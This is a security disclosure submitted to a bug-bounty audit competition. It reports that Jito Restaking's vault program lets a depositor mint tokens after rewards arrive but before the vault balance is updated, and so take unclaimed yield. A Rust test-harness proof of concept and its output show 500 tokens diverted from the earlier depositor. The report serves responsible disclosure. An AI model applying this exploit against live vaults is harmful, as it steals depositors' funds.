# #37315 \[SC-High] Theft of Unclaimed Yields Due to Improper Reward Distribution in Vault Program

**Submitted on Dec 2nd 2024 at 06:40:54 UTC by @GlitchLens for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

* **Report ID:** #37315
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/jito-foundation/restaking/tree/master/vault\\_program>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The vault program suffers from a vulnerability in its reward distribution mechanism where the `UpdateVaultBalance` function is not enforced before minting or other actions involving `vault.deposited_tokens`. This allows an attacker to mint tokens immediately after rewards are deposited but before the balance update, enabling them to unfairly claim a portion of the rewards they did not contribute to. Exploiting this could result in financial losses for legitimate depositors and enable theft of unclaimed yields.

## Vulnerability Details

The vulnerability lies in the lack of enforcement for calling `UpdateVaultBalance` before performing operations like `mint_to`. This causes an inaccurate calculation of rewards:

1. When rewards are deposited into the vault, they are initially unclaimed and stored in the vault's token account.
2. If a new depositor mints tokens before the balance update, they are included in the reward distribution calculation.
3. This results in the redistribution of existing rewards, allowing the new depositor to claim unclaimed yields they are not entitled to.

For example:

* Depositor1 deposits 10,000 tokens.
* Rewards of 1,000 tokens are added to the vault, intended entirely for Depositor1.
* Depositor2 mints tokens before `UpdateVaultBalance` is called.
* The rewards are recalculated to include Depositor2, diverting a portion of Depositor1's rightful share.

## Impact Details

* **Theft of Unclaimed Yield:** Attackers can exploit the system to claim rewards they did not contribute to, directly stealing unclaimed yields.
* **Financial Loss:** Legitimate depositors lose a portion of their entitled rewards, resulting in direct monetary losses.

## References

<https://github.com/jito-foundation/restaking/blob/master/vault\\_program/src/mint\\_to.rs> <https://github.com/jito-foundation/restaking/blob/master/vault\\_program/src/update\\_vault\\_balance.rs>

## Proof of Concept

## Proof of Concept

In the provided PoC:

* Depositor1 deposits 10,000 tokens and is entitled to 1,000 tokens in rewards.
* Depositor2 mints an equivalent amount before `UpdateVaultBalance` is called.
* Upon withdrawal, Depositor1 receives only 10,500 tokens instead of the expected 11,000, demonstrating a loss of 500 tokens due to theft of unclaimed yield.

yield\_theft.rs

```rust
#[cfg(test)]
mod tests {
    use jito_vault_core::config::Config;
    use solana_sdk::{signature::Keypair, signer::Signer};
    use spl_associated_token_account::get_associated_token_address;

    use crate::fixtures::{
        fixture::{ConfiguredVault, TestBuilder},
        vault_client::VaultStakerWithdrawalTicketRoot,
    };

    const MINT_AMOUNT: u64 = 10000;
    const REWARD_AMOUNT: u64 = 1000;

    #[tokio::test]
    async fn test_update_vault_balance_ok() {
        let deposit_fee_bps = 0;
        let reward_fee_bps = 0;
        let withdrawal_fee_bps = 0;

        let num_operators = 1;
        let slasher_amounts = vec![];

        let mut fixture = TestBuilder::new().await;

        println!("==============================================");
        println!("Setting up vault with 0 fees..");
        let ConfiguredVault {
            mut vault_program_client,
            restaking_program_client: _,
            vault_config_admin: _,
            vault_root,
            restaking_config_admin: _,
            operator_roots,
        } = fixture
            .setup_vault_with_ncn_and_operators(
                deposit_fee_bps,
                withdrawal_fee_bps,
                reward_fee_bps,
                num_operators,
                &slasher_amounts,
            )
            .await
            .unwrap();

        println!("Vault setup complete!");
        println!("==============================================");
        println!("Depositor1 sets up their account and mint ${}..", MINT_AMOUNT);

        let config = vault_program_client
            .get_config(&Config::find_program_address(&jito_vault_program::id()).0)
            .await
            .unwrap();

        let depositor1 = Keypair::new();
        vault_program_client
            .configure_depositor(&vault_root, &depositor1.pubkey(), MINT_AMOUNT)
            .await
            .unwrap();

        vault_program_client
            .do_mint_to(&vault_root, &depositor1, MINT_AMOUNT, MINT_AMOUNT)
            .await
            .unwrap();

        println!("Depositor1 setup complete!");
        println!("==============================================");
        println!("Emulate reward accumulation. This reward should go to depositor1, since it's generated from their funds..");
        println!("Reward amount: ${}", REWARD_AMOUNT);
        let reward_depositor = Keypair::new();
        vault_program_client
            .configure_depositor(&vault_root, &reward_depositor.pubkey(), REWARD_AMOUNT)
            .await
            .unwrap();

        vault_program_client
            .create_and_fund_reward_vault(&vault_root.vault_pubkey, &reward_depositor, REWARD_AMOUNT)
            .await
            .unwrap();
        println!("Reward funded!!");

        println!("==============================================");
        println!("Exploit begins..");
        println!("Depositor2 joins immediately after seeing the reward deposit, and effectively `steals` half of the reward..");
        let depositor2 = Keypair::new();
        vault_program_client
            .configure_depositor(&vault_root, &depositor2.pubkey(), MINT_AMOUNT)
            .await
            .unwrap();

        vault_program_client
            .do_mint_to(&vault_root, &depositor2, MINT_AMOUNT, MINT_AMOUNT)
            .await
            .unwrap();

        println!("Exploit done! Update will confirms the theft");
        println!("==============================================");
        println!("Update vault balance..");
        vault_program_client
            .update_vault_balance(&vault_root.vault_pubkey)
            .await
            .unwrap();

        println!("Update complete!");
        println!("==============================================");
        println!("Depositor 1 wants to withdraw their share");
        let VaultStakerWithdrawalTicketRoot { base } = vault_program_client
            .do_enqueue_withdrawal(&vault_root, &depositor1, MINT_AMOUNT)
            .await
            .unwrap();

        println!("Wait for epoch changes..");
        fixture
            .warp_slot_incremental(config.epoch_length() * 2)
            .await
            .unwrap();

        vault_program_client
            .do_full_vault_update(
                &vault_root.vault_pubkey,
                &[operator_roots[0].operator_pubkey],
            )
            .await
            .unwrap();

        println!("Depositor1 withdraws their share..");
        vault_program_client
            .do_burn_withdrawal_ticket(&vault_root, &depositor1, &base, &config.program_fee_wallet)
            .await
            .unwrap();

        let vault = vault_program_client
            .get_vault(&vault_root.vault_pubkey)
            .await
            .unwrap();

        let depositor_token_account = fixture
            .get_token_account(&get_associated_token_address(
                &depositor1.pubkey(),
                &vault.supported_mint,
            ))
            .await
            .unwrap();
        
        println!("Withdrawal complete!");
        println!("==============================================");
        println!("The reward should all belong to depositor1 (since fee == 0)");
        println!("Current balance: ${}", depositor_token_account.amount);
        println!("Expected balance: ${}", MINT_AMOUNT + REWARD_AMOUNT);
        println!("==============================================");

        assert_eq!(depositor_token_account.amount, MINT_AMOUNT + REWARD_AMOUNT);
    }
}
```

running the poc with `cargo test` give the following output

```
---- poc::yield_theft::tests::test_update_vault_balance_ok stdout ----
==============================================
Setting up vault with 0 fees..
Vault setup complete!
==============================================
Depositor1 sets up their account and mint $10000..
Depositor1 setup complete!
==============================================
Emulate reward accumulation. This reward should go to depositor1, since it's generated from their funds..
Reward amount: $1000
Reward funded!!
==============================================
Exploit begins..
Depositor2 joins immediately after seeing the reward deposit, and effectively `steals` half of the reward..
Exploit done! Update will confirms the theft
==============================================
Update vault balance..
Update complete!
==============================================
Depositor 1 wants to withdraw their share
Wait for epoch changes..
Depositor1 withdraws their share..
Withdrawal complete!
==============================================
The reward should all belong to depositor1 (since fee == 0)
Current balance: $10500
Expected balance: $11000
==============================================
thread 'poc::yield_theft::tests::test_update_vault_balance_ok' panicked at integration_tests/tests/poc/yield_theft.rs:152:9:
assertion `left == right` failed
  left: 10500
 right: 11000
```
